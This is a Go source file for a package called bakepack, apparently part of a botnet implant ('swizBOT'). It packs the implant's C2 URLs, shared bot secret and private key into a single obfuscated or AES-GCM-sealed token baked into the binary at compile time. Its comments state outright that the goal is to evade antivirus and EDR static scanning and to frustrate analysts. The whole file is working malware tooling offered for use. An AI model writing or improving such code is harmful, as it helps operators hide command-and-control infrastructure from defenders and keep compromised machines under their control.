// Package bakepack packs implant configuration for compile-time embedding.
//
// Baked config used to be injected as individual plaintext strings via
// `-ldflags -X main.bakedC2URLs=... -X main.bakedBotSecret=...`, which left
// the C2 URLs, the shared bot secret and the implant private key recoverable
// with a single `strings` pass over the shipped binary. bakepack replaces the
// per-field symbols with one opaque token:
//
//	b1.<base64url>  obfuscated - salt(16) || json XOR SHA-256 keystream
//	b2.<base64url>  sealed     - salt(16) || nonce(12) || AES-256-GCM(json)
//	                             key = PBKDF2-HMAC-SHA256(passphrase, salt)
//
// b1 keeps secrets out of `strings` (casual triage, AV/EDR static string
// scanning, config greps) but is obfuscation, not encryption: an analyst who
// reverses the token format can recover it. b2 is real authenticated
// encryption under an operator passphrase supplied out-of-band at runtime
// (SWIZ_UNLOCK), so the binary by itself discloses nothing and is inert
// without that secret.
package bakepack

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"io"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

const (
	obfPrefix  = "b1."
	sealPrefix = "b2."

	saltLen  = 16
	nonceLen = 12

	pbkdf2Iters = 210000 // OWASP-2023 floor for PBKDF2-HMAC-SHA256
	keyLen      = 32

	// seed is a fixed domain separator mixed into the obfuscation keystream.
	seed = "swizBOT/baked/v1"
)

// ErrPassphraseRequired is returned when a sealed token is unpacked without
// a passphrase.
var ErrPassphraseRequired = errors.New("bakepack: sealed config requires a passphrase (SWIZ_UNLOCK)")

// ErrBadPassphrase is returned when a sealed token fails authentication.
var ErrBadPassphrase = errors.New("bakepack: passphrase rejected (authentication failed)")

var b64 = base64.RawURLEncoding

// Pack encodes values into a single baked token. An empty passphrase produces
// an obfuscated (b1) token; a non-empty passphrase produces a sealed (b2)
// token. Empty values are dropped so the token stays minimal.
func Pack(values map[string]string, passphrase string) (string, error) {
	clean := make(map[string]string, len(values))
	for k, v := range values {
		if v != "" {
			clean[k] = v
		}
	}
	if len(clean) == 0 {
		return "", errors.New("bakepack: nothing to pack")
	}
	raw, err := json.Marshal(clean)
	if err != nil {
		return "", err
	}

	salt := make([]byte, saltLen)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		return "", err
	}

	if passphrase == "" {
		ct := xorBytes(raw, keystream(len(raw), salt))
		buf := append(append([]byte{}, salt...), ct...)
		return obfPrefix + b64.EncodeToString(buf), nil
	}

	key := pbkdf2.Key([]byte(passphrase), salt, pbkdf2Iters, keyLen, sha256.New)
	aead, err := newGCM(key)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, nonceLen)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ct := aead.Seal(nil, nonce, raw, nil)

	buf := make([]byte, 0, saltLen+nonceLen+len(ct))
	buf = append(buf, salt...)
	buf = append(buf, nonce...)
	buf = append(buf, ct...)
	return sealPrefix + b64.EncodeToString(buf), nil
}

// Unpack decodes a baked token. Sealed tokens need the same passphrase used
// at pack time; obfuscated tokens ignore it.
func Unpack(token, passphrase string) (map[string]string, error) {
	switch {
	case strings.HasPrefix(token, obfPrefix):
		buf, err := b64.DecodeString(strings.TrimPrefix(token, obfPrefix))
		if err != nil {
			return nil, err
		}
		if len(buf) < saltLen {
			return nil, errors.New("bakepack: obfuscated token too short")
		}
		salt, ct := buf[:saltLen], buf[saltLen:]
		raw := xorBytes(ct, keystream(len(ct), salt))
		return decode(raw)

	case strings.HasPrefix(token, sealPrefix):
		buf, err := b64.DecodeString(strings.TrimPrefix(token, sealPrefix))
		if err != nil {
			return nil, err
		}
		if len(buf) < saltLen+nonceLen {
			return nil, errors.New("bakepack: sealed token too short")
		}
		if passphrase == "" {
			return nil, ErrPassphraseRequired
		}
		salt := buf[:saltLen]
		nonce := buf[saltLen : saltLen+nonceLen]
		ct := buf[saltLen+nonceLen:]

		key := pbkdf2.Key([]byte(passphrase), salt, pbkdf2Iters, keyLen, sha256.New)
		aead, err := newGCM(key)
		if err != nil {
			return nil, err
		}
		raw, err := aead.Open(nil, nonce, ct, nil)
		if err != nil {
			return nil, ErrBadPassphrase
		}
		return decode(raw)

	default:
		return nil, errors.New("bakepack: unrecognized token")
	}
}

// IsSealed reports whether the token is an authenticated (b2) token.
func IsSealed(token string) bool { return strings.HasPrefix(token, sealPrefix) }

func decode(raw []byte) (map[string]string, error) {
	out := map[string]string{}
	if err := json.Unmarshal(raw, &out); err != nil {
		return nil, errors.New("bakepack: corrupt payload")
	}
	return out, nil
}

func newGCM(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

// keystream returns n bytes of SHA-256(seed || salt || counter) output as a
// deterministic XOR pad. It is deliberately cheap: it only has to defeat
// static string extraction, not a determined reverse engineer.
func keystream(n int, salt []byte) []byte {
	out := make([]byte, 0, n+sha256.Size)
	var ctr uint32
	var ctrBuf [4]byte
	for len(out) < n {
		h := sha256.New()
		h.Write([]byte(seed))
		h.Write(salt)
		binary.BigEndian.PutUint32(ctrBuf[:], ctr)
		h.Write(ctrBuf[:])
		out = append(out, h.Sum(nil)...)
		ctr++
	}
	return out[:n]
}

func xorBytes(a, b []byte) []byte {
	out := make([]byte, len(a))
	for i := range a {
		out[i] = a[i] ^ b[i]
	}
	return out
}
